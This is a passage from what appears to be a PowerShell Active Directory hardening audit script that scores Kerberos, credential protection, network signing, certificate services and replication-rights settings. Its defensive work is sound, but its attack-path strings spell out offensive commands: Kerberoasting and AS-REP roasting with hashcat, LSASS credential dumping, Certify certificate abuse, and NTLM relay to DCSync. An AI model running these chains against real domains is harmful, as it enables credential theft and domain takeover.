    Add-Finding "PasswordPolicy" "Min Password Length" "High" "Minimum length: $minLen chars -- critically weak. Trivial brute force." `
        -Fix "Set-ADDefaultDomainPasswordPolicy -Identity $domFQDN -MinPasswordLength 14" `
        -MITRE "T1110.001" -CIS "1.1.1" -Pts 0 -Max 3
}

# 4.2 Password history
if ($history -ge 24) {
    Add-Finding "PasswordPolicy" "Password History" "Good" "History: $history passwords -- prevents reuse" -Pts 2 -Max 2 -CIS "1.1.2"
} else {
    Add-Finding "PasswordPolicy" "Password History" "Medium" "Password history: $history (should be >=24)" `
        -Fix "Set-ADDefaultDomainPasswordPolicy -Identity $domFQDN -PasswordHistoryCount 24" -CIS "1.1.2" -Pts 0 -Max 2
}

# 4.3 Account lockout threshold
if ($lockout -ge 5 -and $lockout -le 10) {
    Add-Finding "PasswordPolicy" "Lockout Threshold" "Good" "Lockout at $lockout attempts -- balanced security" -Pts 3 -Max 3 -CIS "1.2.1"
} elseif ($lockout -eq 0) {
    Add-Finding "PasswordPolicy" "Lockout Threshold" "Critical" "No account lockout configured -- unlimited password spraying / brute force possible" `
        -Fix "Set-ADDefaultDomainPasswordPolicy -Identity $domFQDN -LockoutThreshold 5 -LockoutDuration 00:30:00 -LockoutObservationWindow 00:30:00" `
        -MITRE "T1110.003" -CIS "1.2.1" -Pts 0 -Max 3
} else {
    Add-Finding "PasswordPolicy" "Lockout Threshold" "Medium" "Lockout threshold: $lockout -- CIS recommends 5-10" `
        -Fix "Set-ADDefaultDomainPasswordPolicy -Identity $domFQDN -LockoutThreshold 5" -CIS "1.2.1" -Pts 1 -Max 3
}

# 4.4 Fine-grained password policies for privileged accounts
$fgpps = @(Get-ADFineGrainedPasswordPolicy -Filter * @dcParam)
$privFGPP = @(@($fgpps) | Where-Object {
    $subjects = Get-ADFineGrainedPasswordPolicySubject -Identity $_.Name @dcParam -ErrorAction SilentlyContinue
    @($subjects) | Where-Object { $_.Name -match "Domain Admins|Protected Users|Tier 0" }
})
if ($privFGPP.Count -gt 0) {
    Add-Finding "PasswordPolicy" "FGPP for Privileged Accounts" "Good" `
        "$($privFGPP.Count) FGPP(s) applied to privileged groups -- stricter policies enforced for admins" -Pts 3 -Max 3
} else {
    Add-Finding "PasswordPolicy" "FGPP for Privileged Accounts" "Medium" `
        "No Fine-Grained Password Policy applied to Domain Admins/Protected Users -- privileged accounts use same policy as regular users" `
        -Fix "New-ADFineGrainedPasswordPolicy -Name 'Tier0-Policy' -Precedence 1 -MinPasswordLength 20 -PasswordHistoryCount 24 -LockoutThreshold 3 -ComplexityEnabled `$true. Then: Add-ADFineGrainedPasswordPolicySubject 'Tier0-Policy' -Subjects 'Domain Admins'" `
        -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 5 -- KERBEROS & DELEGATION
# ===============================================================================
Write-Section "5. KERBEROS & DELEGATION"

# UAC bitmask constants -- LDAPFilter bitwise match avoids computed-property
# ambiguity in -Filter {} across different AD module / OS versions.
$UAC_ACCOUNTDISABLE         = 2          # bit 1  -- account disabled
$UAC_TRUSTED_FOR_DELEGATION = 524288     # bit 19 -- unconstrained delegation
$UAC_DONT_REQUIRE_PREAUTH   = 4194304   # bit 22 -- AS-REP roastable (pre-auth off)
$UAC_TRUSTED_TO_AUTH_DELEG  = 16777216  # bit 24 -- constrained + protocol transition

# 5.1 Unconstrained Delegation (non-DC computers)
# Exclusion: DCs in the default OU=Domain Controllers container legitimately have
# TrustedForDelegation. Use primaryGroupID=516 (Domain Controllers) as the authoritative
# check -- avoids both false positives from custom DC OUs and false negatives from
# non-DC computers staged in a similarly-named OU.
$dcPrimaryGroupID = 516   # Domain Controllers well-known RID
$unconstrainedComputers = @(
    Get-ADComputer -LDAPFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=$UAC_TRUSTED_FOR_DELEGATION)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE)))" `
        -Properties DistinguishedName,PrimaryGroup,PrimaryGroupID @dcParam -ErrorAction SilentlyContinue |
    Where-Object { $_.PrimaryGroupID -ne $dcPrimaryGroupID }
)
if ($unconstrainedComputers.Count -eq 0) {
    Add-Finding "Kerberos" "Unconstrained Delegation -- Computers" "Good" "No non-DC computers with unconstrained delegation" -Pts 5 -Max 5
} else {
    Add-Finding "Kerberos" "Unconstrained Delegation -- Computers" "Critical" `
        "$($unconstrainedComputers.Count) computer(s) have unconstrained delegation -- any user authenticating to this host lets attacker extract their TGT and impersonate them to any service" `
        -Resources ($unconstrainedComputers.Name) `
        -AttackPath "Printer Bug / Petit-Potam coerce DC -> DC TGT cached on delegating host -> extract with $($script:T.RB) -> DCSync -> domain compromise" `
        -Fix "For each: Set-ADComputer NAME -TrustedForDelegation `$false. Replace with constrained delegation or Resource-Based Constrained Delegation (RBCD)." `
        -MITRE "T1558.001" -CIS "2.7" -Pts 0 -Max 5
}

# 5.2 Unconstrained Delegation -- user accounts
$unconstrainedUsers = @(
    Get-ADUser -LDAPFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=$UAC_TRUSTED_FOR_DELEGATION)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE)))" `
        @dcParam -ErrorAction SilentlyContinue
)
if ($unconstrainedUsers.Count -gt 0) {
    Add-Finding "Kerberos" "Unconstrained Delegation -- Users" "Critical" `
        "$($unconstrainedUsers.Count) user account(s) with unconstrained delegation -- same attack path as above, via user service SPN" `
        -Resources ($unconstrainedUsers.SamAccountName) `
        -Fix "Set-ADUser NAME -TrustedForDelegation `$false" `
        -MITRE "T1558.001" -Pts 0 -Max 4
} else {
    Add-Finding "Kerberos" "Unconstrained Delegation -- Users" "Good" "No user accounts with unconstrained delegation" -Pts 4 -Max 4
}

# 5.2b Privileged accounts missing "Account is sensitive and cannot be delegated"
# UAC bit NOT_DELEGATED (0x100000 = 1048576) blocks a service from forwarding this
# account's TGT even if the service has unconstrained delegation.
# Without this flag, any service with unconstrained delegation that receives auth
# from a DA/EA can cache and replay their TGT -- instant privilege escalation.
#
# Scope: adminCount=1 (covers all SDProp-protected accounts: DA, EA, Schema Admins,
#        Backup/Print/Server Operators, Account Operators, Administrators, krbtgt).
# False-positive controls:
#   - Skip disabled accounts (can't authenticate, flag is irrelevant)
#   - Skip krbtgt (never interactively authenticates to services)
#   - Skip computer accounts (flag applies to users only)
$UAC_NOT_DELEGATED = 1048576   # 0x100000

$privNoSensitive = @(
    Get-ADUser -LDAPFilter "(&(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE))(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_NOT_DELEGATED)))" `
        -Properties AdminCount, AccountNotDelegated, Enabled @dcParam -ErrorAction SilentlyContinue |
    Where-Object { $_.SamAccountName -ne 'krbtgt' }
)

if ($privNoSensitive.Count -eq 0) {
    Add-Finding "Kerberos" "Admins Sensitive Flag" "Good" `
        "All privileged accounts (adminCount=1) have 'Account is sensitive and cannot be delegated' set" -Pts 4 -Max 4
} else {
    Add-Finding "Kerberos" "Admins Without Sensitive Protection Flag" "High" `
        "$($privNoSensitive.Count) privileged account(s) missing the 'Account is sensitive and cannot be delegated' flag -- if any service with unconstrained delegation authenticates these accounts, their TGT can be extracted and replayed" `
        -Resources ($privNoSensitive.SamAccountName) `
        -AttackPath "Printer-Bug/PetitPotam coerce DA auth to unconstrained host -> DA TGT cached -> $($script:T.RB) dump TGT -> Pass-the-Ticket as DA -> full domain compromise. Flag prevents TGT forwarding even if coercion succeeds." `
        -Fix @"
# Set flag on each account -- bulk remediation:
Get-ADUser -LDAPFilter '(&(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=1048576)))' |
  Where-Object { `$_.SamAccountName -ne 'krbtgt' } |
  ForEach-Object { Set-ADAccountControl -Identity `$_.SamAccountName -AccountNotDelegated `$true }

# Verify:
Get-ADUser -Filter { adminCount -eq 1 } -Properties AccountNotDelegated |
  Select Name, SamAccountName, AccountNotDelegated
"@ `
        -MITRE "T1558.001" -CIS "2.3.9" -Pts 0 -Max 4
}

# 5.3 Kerb-roastable accounts (SPN on enabled user objects)
# Fix: -Filter { ServicePrincipalName -ne "$null" } used a string literal, never matched.
# LDAPFilter (servicePrincipalName=*) is the correct LDAP presence check.
$kerbRoastable = @(
    Get-ADUser -LDAPFilter "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE)))" `
        -Properties ServicePrincipalName,PasswordLastSet,AdminCount @dcParam -ErrorAction SilentlyContinue
)
$kerbPrivileged =@( @($kerbRoastable | Where-Object { $_.AdminCount -eq 1 }))
if ($kerbPrivileged.Count -gt 0) {
    Add-Finding "Kerberos" "Kerb-roastable Privileged Accounts" "Critical" `
        "$($kerbPrivileged.Count) PRIVILEGED account(s) with SPNs (Kerb-roastable) -- offline hash cracking -> privileged credentials" `
        -Resources ($kerbPrivileged.SamAccountName) `
        -AttackPath "GetUserSPNs.py -request corp.local/user:pass -> request TGS -> hashcat -m 13100 hash.txt rockyou.txt -> privileged account password" `
        -Fix "Migrate to gMSA (automatic 240-char password, cannot be cracked). Or use AES-only with long random password." `
        -MITRE "T1558.003" -Pts 0 -Max 6
}
if ($kerbRoastable.Count -gt 0) {
    $staleKerb =@( @($kerbRoastable | Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-365) }))
    Add-Finding "Kerberos" "Kerb-roastable Account Count" "High" `
        "$($kerbRoastable.Count) total Kerb-roastable account(s). $($staleKerb.Count) with password age >1 year (easier to crack)." `
        -Resources ($kerbRoastable.SamAccountName) `
        -Fix "Migrate all to gMSA. For unavoidable SPNs: enforce AES-only, set 25+ char random passwords, rotate every 30 days." `
        -MITRE "T1558.003" -Pts 0 -Max 4
} else {
    Add-Finding "Kerberos" "Kerb-roastable Accounts" "Good" "No user accounts with SPNs (Kerb-roasting not applicable)" -Pts 4 -Max 4
}

# 5.4 AS-REP Roastable accounts
# DoesNotRequirePreAuth is a computed UAC property -- use LDAPFilter with bit 0x400000
$asrepRoastable = @(
    Get-ADUser -LDAPFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=$UAC_DONT_REQUIRE_PREAUTH)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE)))" `
        -Properties PasswordLastSet @dcParam -ErrorAction SilentlyContinue
)
if ($asrepRoastable.Count -eq 0) {
    Add-Finding "Kerberos" "AS-REP Roastable Accounts" "Good" "No accounts with pre-auth disabled" -Pts 4 -Max 4
} else {
    Add-Finding "Kerberos" "AS-REP Roastable Accounts" "Critical" `
        "$($asrepRoastable.Count) account(s) have DoesNotRequirePreAuth=True -- AS-REP hash obtainable WITHOUT credentials, crackable offline" `
        -Resources ($asrepRoastable.SamAccountName) `
        -AttackPath "GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -> AS-REP hashes -> hashcat -m 18200 -> account password (no domain creds needed)" `
        -Fix "Set-ADUser USER -DoesNotRequirePreAuth `$false for all accounts. This flag should never be set." `
        -MITRE "T1558.004" -Pts 0 -Max 4
}

# 5.5 RC4 / DES encryption weaknesses (service accounts only)
$rc4DESAccounts = @(
    Get-ADUser -LDAPFilter "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=$UAC_ACCOUNTDISABLE)))" `
        -Properties 'msDS-SupportedEncryptionTypes',ServicePrincipalName @dcParam -ErrorAction SilentlyContinue |
    Where-Object {
        $enc = [int]($_.'msDS-SupportedEncryptionTypes')
        # enc=0 means default (RC4 allowed); bit2=RC4; DES bits 0-1
        ($enc -eq 0) -or ($enc -band 0x4) -or (($enc -band 0x3) -and -not ($enc -band 0x18))
    }
)
if ($rc4DESAccounts.Count -eq 0) {
    Add-Finding "Kerberos" "RC4/DES Kerberos Encryption" "Good" "No service accounts with RC4/DES encryption" -Pts 3 -Max 3
} else {
    Add-Finding "Kerberos" "RC4/DES Kerberos Encryption" "High" `
        "$($rc4DESAccounts.Count) service account(s) support RC4/DES Kerberos -- RC4 TGS tickets are faster to crack than AES" `
        -Resources ($rc4DESAccounts.SamAccountName) `
        -Fix "Set msDS-SupportedEncryptionTypes=24 (AES128+AES256 only) on all service accounts. Audit with 4769 RC4 events." `
        -MITRE "T1558.003" -Pts 0 -Max 3
}

# 5.6 SIDHistory -- privilege escalation via history
# sIDHistory is a real LDAP attribute -- LDAPFilter presence check is reliable
$sidHistoryAccounts = @(
    Get-ADUser -LDAPFilter "(sIDHistory=*)" -Properties SIDHistory @dcParam -ErrorAction SilentlyContinue |
    Where-Object { $_.SIDHistory }
)
if ($sidHistoryAccounts.Count -gt 0) {
    Add-Finding "Kerberos" "SIDHistory Present" "High" `
        "$($sidHistoryAccounts.Count) account(s) have SIDHistory attributes -- may grant unintended elevated access from previous domain" `
        -Resources ($sidHistoryAccounts.SamAccountName) `
        -AttackPath "Account with SIDHistory of privileged account -> Kerberos PAC includes both current and historical SIDs -> inherits old permissions" `
        -Fix "Review each SIDHistory entry. Remove if not required for migration: Set-ADUser USER -Remove @{SIDHistory='SID'}" `
        -MITRE "T1134.005" -Pts 0 -Max 3
} else {
    Add-Finding "Kerberos" "SIDHistory" "Good" "No accounts with SIDHistory" -Pts 3 -Max 3
}

# ===============================================================================
# DOMAIN 6 -- CREDENTIAL PROTECTION
# ===============================================================================
Write-Section "6. CREDENTIAL PROTECTION"

# 6.1 Credential Guard
$credGuard = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" "EnableVirtualizationBasedSecurity"
$lsaCfgFlags = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "LsaCfgFlags"
if ($lsaCfgFlags -ge 1 -or $credGuard -ge 1) {
    Add-Finding "CredProtection" "Credential Guard" "Good" "Credential Guard enabled -- LSA-SS credentials protected by VBS/hypervisor" -Pts 5 -Max 5
} else {
    Add-Finding "CredProtection" "Credential Guard" "Critical" `
        "Credential Guard NOT enabled -- NTLM hashes and Kerberos keys in LSA-SS memory are extractable with Cred-Dump-Tool (sekurl-sa::logon-passwords)" `
        -AttackPath "Cred-Dump-Tool privilege::debug + sekurl-sa::logon-passwords -> NTLM hashes of all logged-on users including DAs -> Pass-Hash to entire domain" `
        -Fix "Enable via GPO: Computer Config -> Admin Templates -> System -> Device Guard -> Turn On Virtualization Based Security -> Enable with UEFI Lock. Requires UEFI + Secure Boot." `
        -MITRE "T1003.001" -CIS "3.1" -Pts 0 -Max 5
}

# 6.2 LSA Protection (RunAsPPL)
$runAsPPL = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "RunAsPPL"
if ($runAsPPL -ge 1) {
    Add-Finding "CredProtection" "LSA Protection (RunAsPPL)" "Good" "LSA Protected Process Light enabled -- Cred-Dump-Tool requires kernel driver to bypass" -Pts 4 -Max 4
} else {
    Add-Finding "CredProtection" "LSA Protection (RunAsPPL)" "High" `
        "LSA Protection (RunAsPPL) NOT enabled -- Cred-Dump-Tool can dump LSA-SS without kernel access" `
        -Fix "GPO: Computer Config -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> LSA Protection. Or registry: HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -> RunAsPPL=1 (requires reboot)." `
        -MITRE "T1003.001" -Pts 0 -Max 4
}

# 6.3 WDigest authentication (cleartext passwords in LSA-SS)
$wdigest = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" "UseLogonCredential"
if ($wdigest -eq 0 -or $null -eq $wdigest) {
    Add-Finding "CredProtection" "WDigest Disabled" "Good" "WDigest authentication disabled -- no cleartext passwords cached in LSA-SS" -Pts 4 -Max 4
} else {
    Add-Finding "CredProtection" "WDigest Enabled" "Critical" `
        "WDigest authentication ENABLED -- cleartext user passwords stored in LSA-SS memory. Cred-Dump-Tool can read them directly." `
        -Fix "GPO: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest -> UseLogonCredential=0" `
        -MITRE "T1003.001" -CIS "3.2" -Pts 0 -Max 4
}

# 6.4 NTLM authentication level
$ntlmLevel = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "LmCompatibilityLevel"
if ($ntlmLevel -ge 5) {
    Add-Finding "CredProtection" "NTLM Level" "Good" "LmCompatibilityLevel=$ntlmLevel -- NTLMv1 disabled, NTLMv2 required" -Pts 3 -Max 3 -CIS "2.3.11.7"
} elseif ($ntlmLevel -ge 3) {
    Add-Finding "CredProtection" "NTLM Level" "Medium" "LmCompatibilityLevel=$ntlmLevel -- NTLMv2 sent but v1 may still be accepted" `
        -Fix "GPO: Computer Config -> Windows Settings -> Security Options -> Network security: LAN Manager authentication level -> Send NTLMv2 only/refuse LM & NTLM (Level 5)" -CIS "2.3.11.7" -Pts 1 -Max 3
} else {
    Add-Finding "CredProtection" "NTLM Level" "Critical" "LmCompatibilityLevel=$ntlmLevel -- NTLMv1/LM enabled. LM hashes trivially crackable." `
        -Fix "Set LmCompatibilityLevel=5 via GPO." `
        -MITRE "T1557.001" -CIS "2.3.11.7" -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 7 -- NETWORK SIGNING
# ===============================================================================
Write-Section "7. NETWORK SIGNING"

# 7.1 SMB signing
$smbConfig = Get-SmbServerConfiguration -ErrorAction SilentlyContinue
if ($smbConfig -and $smbConfig.RequireSecuritySignature) {
    Add-Finding "NetworkSigning" "SMB Signing Required" "Good" "SMB signing required on this host -- NTLM relay via SMB blocked" -Pts 5 -Max 5
} else {
    Add-Finding "NetworkSigning" "SMB Signing Not Required" "Critical" `
        "SMB signing NOT required -- NTLM relay attacks possible: coerce authentication -> relay to SMB -> remote code execution without credentials" `
        -AttackPath "$($script:T.RS) + $($script:T.NR) -> coerce DC auth via Petit-Potam/Printer-Bug -> relay to SMB share -> remote code execution / DCSync" `
        -Fix "GPO: Computer Config -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Microsoft network server: Digitally sign communications (always) = Enabled" `
        -MITRE "T1557.001" -CIS "2.3.9.2" -Pts 0 -Max 5
}

# 7.2 LDAP signing
# NTDS\Parameters only exists on DCs. On member servers Get-RegValue returns $null,
# which would be misread as "level 1 = negotiated" and generate a false Medium finding.
# Guard with $isDC so the check only runs where the registry key is meaningful.
if ($isDC) {
    $ldapSigning = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "LDAPServerIntegrity"
    $ldapLevel = if ($null -eq $ldapSigning) { 1 } else { $ldapSigning }
    if ($ldapLevel -ge 2) {
        Add-Finding "NetworkSigning" "LDAP Signing Required" "Good" "LDAP signing required (LDAPServerIntegrity=2)" -Pts 4 -Max 4 -CIS "2.3.11.9"
    } elseif ($ldapLevel -eq 1) {
        Add-Finding "NetworkSigning" "LDAP Signing Negotiated" "Medium" "LDAP signing negotiated but not required -- NTLM relay to LDAP possible from hosts that don't negotiate signing" `
            -Fix "GPO: Domain Controller Security Policy -> Security Options -> Domain controller: LDAP server signing requirements -> Require signing" -CIS "2.3.11.9" -Pts 1 -Max 4
    } else {
        Add-Finding "NetworkSigning" "LDAP Signing Disabled" "Critical" `
            "LDAP signing disabled -- NTLM relay to LDAP: create computer accounts, modify ACLs, add DC-Sync rights" `
            -AttackPath "Coerce DC auth -> relay to LDAP unsigned -> write ACL on domain object -> grant DC-Sync -> dump all hashes" `
            -Fix "Set LDAPServerIntegrity=2 via GPO." -MITRE "T1557.001" -CIS "2.3.11.9" -Pts 0 -Max 4
    }
} else {
    Add-Finding "NetworkSigning" "LDAP Signing" "Info" `
        "LDAP signing check skipped -- HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters only exists on DCs. Re-run this script on a Domain Controller for accurate results." `
        -Pts 0 -Max 4
}

# 7.3 LDAP Channel Binding
if ($isDC) {
    $ldapCB = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "LdapEnforceChannelBinding"
    if ($ldapCB -ge 2) {
        Add-Finding "NetworkSigning" "LDAP Channel Binding" "Good" "LDAP channel binding enforced -- LDAP relay over TLS blocked" -Pts 3 -Max 3
    } else {
        Add-Finding "NetworkSigning" "LDAP Channel Binding Not Enforced" "High" `
            "LDAP channel binding not enforced (value=$ldapCB) -- NTLM relay over LDAPS possible even with signing" `
            -Fix "Set HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters -> LdapEnforceChannelBinding=2" `
            -MITRE "T1557.001" -Pts 0 -Max 3
    }
} else {
    Add-Finding "NetworkSigning" "LDAP Channel Binding" "Info" `
        "LDAP channel binding check skipped -- only applicable on Domain Controllers. Re-run on a DC." `
        -Pts 0 -Max 3
}

# 7.4 LLMNR disabled
$llmnr = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" "EnableMulticast"
if ($llmnr -eq 0) {
    Add-Finding "NetworkSigning" "LLMNR Disabled" "Good" "LLMNR disabled -- $($script:T.RS) poisoning blocked" -Pts 3 -Max 3
} else {
    Add-Finding "NetworkSigning" "LLMNR Enabled" "High" `
        "LLMNR enabled -- $($script:T.RS) can poison LLMNR queries -> capture NTLMv2 hashes from any host -> crack or relay" `
        -Fix "GPO: Computer Config -> Admin Templates -> Network -> DNS Client -> Turn off multicast name resolution = Enabled" `
        -MITRE "T1557.001" -Pts 0 -Max 3
}

# 7.5 NetBIOS over TCP/IP
$netbiosKey = "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
$netbiosDisabled = $true
if (Test-Path $netbiosKey) {
    $interfaces = Get-ChildItem $netbiosKey -ErrorAction SilentlyContinue
    foreach ($iface in $interfaces) {
        $nb = (Get-ItemProperty $iface.PSPath).NetbiosOptions
        if ($nb -ne 2) { $netbiosDisabled = $false; break }
    }
}
if ($netbiosDisabled) {
    Add-Finding "NetworkSigning" "NetBIOS Disabled" "Good" "NetBIOS over TCP/IP disabled on all interfaces" -Pts 2 -Max 2
} else {
    Add-Finding "NetworkSigning" "NetBIOS Enabled" "High" `
        "NetBIOS over TCP/IP enabled -- $($script:T.RS) can capture NetBIOS name resolution hashes" `
        -Fix "GPO via DHCP option 001 or WMI script: Set NetbiosOptions=2 on all NIC adapters. Or use DHCP scope option 001=0x2." `
        -MITRE "T1557.001" -Pts 0 -Max 2
}

# ===============================================================================
# DOMAIN 8 -- ADCS / PKI
# ===============================================================================
Write-Section "8. ADCS / PKI"

$adcsAvail = $false
$caObjects  = @()
try {
    $pkiPath   = "CN=Public Key Services,CN=Services,$configNC"
    $caObjects = @(Get-ADObject -SearchBase $pkiPath -Filter { objectClass -eq 'pKIEnrollmentService' } `
        -Properties dNSHostName,certificateTemplates @dcParam -ErrorAction SilentlyContinue)
    if ($caObjects.Count -gt 0) { $adcsAvail = $true }
} catch {}

if (-not $adcsAvail) {
    Add-Finding "ADCS" "ADCS Deployment" "Info" "No Certificate Authority found in this domain" -Pts 0 -Max 0
} else {
    Add-Finding "ADCS" "ADCS Deployment" "Info" "$($caObjects.Count) CA(s) found: $($caObjects.dNSHostName -join ', ')"

    # Enumerate certificate templates
    $templates = @()
    try {
        $templates = @(Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC" `
            -Filter { objectClass -eq 'pKICertificateTemplate' } `
            -Properties 'msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pkiExtendedKeyUsage',
                         'nTSecurityDescriptor','msPKI-RA-Signature' @dcParam -ErrorAction SilentlyContinue)
    } catch {}

    # ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + low-priv enrollment + no manager approval
    $esc1Templates =@( @($templates) | Where-Object {
        # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1
        ($_.'msPKI-Certificate-Name-Flag' -band 1) -and
        # No manager approval required = msPKI-Enrollment-Flag bit 2 not set
        (-not ($_.'msPKI-Enrollment-Flag' -band 2))
    })
    if ($esc1Templates.Count -gt 0) {
        Add-Finding "ADCS" "ESC1 -- Enrollee Supplies Subject" "Critical" `
            "$($esc1Templates.Count) template(s) allow requestor to specify SAN (Subject Alternative Name) -- enroll with DA UPN -> certificate authenticates as Domain Admin" `
            -Resources ($esc1Templates.Name) `
            -AttackPath "Certify.exe find /vulnerable -> request cert with /altname:administrator -> use cert to authenticate as DA -> dump hashes" `
            -Fix "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on affected templates. Enable Manager Approval. Restrict enrollment to specific groups." `
            -MITRE "T1649" -Pts 0 -Max 8
        Write-Host "  [!] ESC1 templates: $($esc1Templates.Name -join ', ')" -ForegroundColor Red
    } else {
        Add-Finding "ADCS" "ESC1 Check" "Good" "No templates with enrollee-supplied SAN + open enrollment" -Pts 8 -Max 8
    }

    # ESC2: Any-purpose EKU templates with low-priv enrollment
    $esc2Templates =@( @($templates) | Where-Object {
        $eku = $_.pkiExtendedKeyUsage
        ($eku -contains '2.5.29.37.0' -or @($eku).Count -eq 0) -and  # Any purpose or no EKU
        (-not ($_.'msPKI-Enrollment-Flag' -band 2))
    })
    if ($esc2Templates.Count -gt 0) {
        Add-Finding "ADCS" "ESC2 -- Any-Purpose Template" "High" `
            "$($esc2Templates.Count) template(s) with Any Purpose EKU and no manager approval -- certificate usable for any authentication purpose" `
            -Resources ($esc2Templates.Name) `
            -Fix "Remove Any Purpose EKU. Restrict to specific EKUs. Enable Manager Approval." `
            -MITRE "T1649" -Pts 0 -Max 5
    }

    # ESC4: Templates with dangerous ACLs (non-admins can edit template)
    $dangerousTemplateACLs = @()
    foreach ($tmpl in $templates) {
        $acl = $tmpl.nTSecurityDescriptor
        if (-not $acl) { continue }
        $dangerousRights = @('GenericAll','WriteDacl','WriteOwner','WriteProperty')
        $riskyAces =@( @($acl.Access) | Where-Object {
            $_.ActiveDirectoryRights.ToString().Split(",").Trim() | Where-Object { $_ -in $dangerousRights }
        } | Where-Object {
            $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|Creator Owner'
        })
        if ($riskyAces) { $dangerousTemplateACLs += $tmpl.Name }
    }
    if ($dangerousTemplateACLs.Count -gt 0) {
        Add-Finding "ADCS" "ESC4 -- Dangerous Template ACLs" "Critical" `
            "$($dangerousTemplateACLs.Count) template(s) with dangerous ACLs -- non-admin accounts can modify template to enable ESC1" `
            -Resources $dangerousTemplateACLs `
            -AttackPath "Modify template -> enable enrollee-supplied SAN -> ESC1 attack -> Domain Admin certificate" `
            -Fix "Remove write permissions from non-admin principals on certificate templates. Audit with: certutil -v -template" `
            -MITRE "T1649" -Pts 0 -Max 6
    } else {
        Add-Finding "ADCS" "ESC4 Check" "Good" "No dangerous ACLs on certificate templates" -Pts 6 -Max 6
    }

    # ESC8: HTTP enrollment endpoint (NTLM relay target)
    foreach ($ca in $caObjects) {
        $caHost = $ca.dNSHostName
        try {
            $resp = Invoke-WebRequest -Uri "http://$caHost/certsrv/" -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
            if ($resp.StatusCode -eq 200 -or $resp.StatusCode -eq 401) {
                Add-Finding "ADCS" "ESC8 -- HTTP Enrollment Endpoint" "Critical" `
                    "CA '$caHost' has HTTP enrollment endpoint reachable -- NTLM relay to certsrv = obtain certificate as any user (including DC machine account)" `
                    -Resources @($caHost) `
                    -AttackPath "Petit-Potam coerce DC -> NTLM relay to http://$caHost/certsrv -> certificate for DC account -> DCSync -> all domain hashes" `
                    -Fix "Require HTTPS on enrollment endpoint. Enable EPA (Extended Protection for Auth). Disable NTLM on IIS. Restrict certsrv to named hosts." `
                    -MITRE "T1649" -Pts 0 -Max 7
                Write-Host "  [!] HTTP certsrv reachable on: $caHost" -ForegroundColor Red
            }
        } catch {}
    }
}

# ===============================================================================
# DOMAIN 9 -- ACL HYGIENE
# ===============================================================================
Write-Section "9. ACL HYGIENE"

$dangerousRights = @('GenericAll','WriteDacl','WriteOwner','GenericWrite','Self','ExtendedRight')

# 9.1 DCSync rights -- granular audit of all three replication extended-right GUIDs
#
#   1131f6aa  Replicating Directory Changes      -- read live replication stream
#   1131f6ad  Replicating Directory Changes All  -- read ALL attributes incl. secrets (key for DCSync)
#   89e95b76  Replicating Directory Changes in Filtered Set -- RODC-filtered replication
#
# Authorised holders: Domain Controllers, Enterprise DCs, SYSTEM, DA, EA, Administrators,
#                     Azure AD Connect MSOL_ account, Exchange servers (documented groups).
#
# MITRE T1003.006 -- DCSync (sub-technique of OS Credential Dumping)
# -----------------------------------------------------------------------------

$replGUIDMap = @{
    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'Replicating Directory Changes'
    '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'Replicating Directory Changes All  *** DCSync key right ***'
    '89e95b76-444d-4c62-991a-0facbeda640c' = 'Replicating Directory Changes in Filtered Set'
}

# Principals that LEGITIMATELY hold these rights
$authorisedReplPattern = 'Domain Controllers|Enterprise Domain Controllers|' +
                          'SYSTEM|Domain Admins|Enterprise Admins|Administrators|' +
                          'NT AUTHORITY|Exchange Windows Permissions|MSOL_|' +
                          'S-1-5-18'

try {
    $domainACL = Get-Acl "AD:\$domainDN" -ErrorAction Stop

    # Collect all replication ACEs for non-authorised principals
    $allReplACEs = [System.Collections.Generic.List[PSCustomObject]]::new()

    foreach ($Ace in $domainACL.Access) {
        $guid = $Ace.ObjectType.ToString()
        if ($guid -notin $replGUIDMap.Keys)                                   { continue }
        if ($Ace.ActiveDirectoryRights -notmatch 'ExtendedRight')             { continue }
        if ($Ace.AccessControlType     -ne 'Allow')                           { continue }
        if ($Ace.IdentityReference.Value -match $authorisedReplPattern)       { continue }

        # Resolve display name
        $principalDisplay = $Ace.IdentityReference.Value
        try {
